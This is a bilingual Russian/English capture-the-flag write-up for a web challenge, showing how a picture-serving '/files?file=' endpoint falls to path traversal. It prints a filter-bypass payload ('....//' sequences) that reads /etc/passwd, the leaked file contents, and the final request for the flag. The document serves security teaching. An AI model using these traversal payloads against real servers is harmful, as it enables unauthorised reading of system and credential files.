# Opener

> Кажется, в этой функции передачи картинок что-то не так...

---

> There seems to be something wrong with this picture transfer function...

## Решение / Solution

Каждая загрузка страницы показывает новую картинку. Можно сразу приступить к рассматриванию
исходного кода *(фрагмент воссоздан по памяти)*:

```html
<script>
    ...fetch("/files?file=" + file)...
</script>
```

Естественным решением данной задачи является Path (Directory) Traversal Attack. Для этого попытаемся
попробовать достучаться до хорошо знакомого `/etc/passwd`.

```url
/files?file=/../../../../etc/passwd
```

Данный путь не работает. Были конечно сомнения, что это не тот эксплоит, но стоило попробовать еще
покопаться. Используя [методы предложенные HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#filter-bypass-tricks),
был получен данный путь:

```url
/files?file=/....//....//....//....//etc/passwd
```

В каждом `....//` сервер находит `../` (`..(../)/`), после удаления оставляя `../`.

```passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:@:sync:/sbin:/bin/sync
shutdown:x:6:@:shutdown:/sbin:/sbin/shutdown
halt:x:7:@:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:8:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue: /sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
```

Дальше ручным перебором (не лучшее решение со стороны автора задания) получился путь к флагу:

```url
/files?file=/....//flag.txt
```

Флаг:

```plain
grodno{P47H_7RAV3r54L_NO_HOMo}
```

---

Every page load shows a new image. Let's instantly begin investigating the source code
*(code fragment is recreated by memory)*:

```html
<script>
    ...fetch("/files?file=" + file)...
</script>
```

A natural solution of this task is Path (Directory) Traversal Attack. For this let's try to knock at
the well-known `/etc/passwd` file.

```url
/files?file=/../../../../etc/passwd
```

This path did not work. There were some doubts whether this is the correct exploit, but it was worth
investigating a bit more. Using [methods suggested by HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#filter-bypass-tricks),
following path has been constructed:

```url
/files?file=/....//....//....//....//etc/passwd
```

In every `....//` server finds `../` (`..(../)/`), after deleting it leaves `../`.

```passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:@:sync:/sbin:/bin/sync
shutdown:x:6:@:shutdown:/sbin:/sbin/shutdown
halt:x:7:@:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:8:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue: /sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000:Linux User,,,:/home/node:/bin/sh
```

Next a manual brute-force (not the best solution by the task author) gave a following path:

```url
/files?file=/....//flag.txt
```

Flag:

```plain
grodno{P47H_7RAV3r54L_NO_HOMo}
```
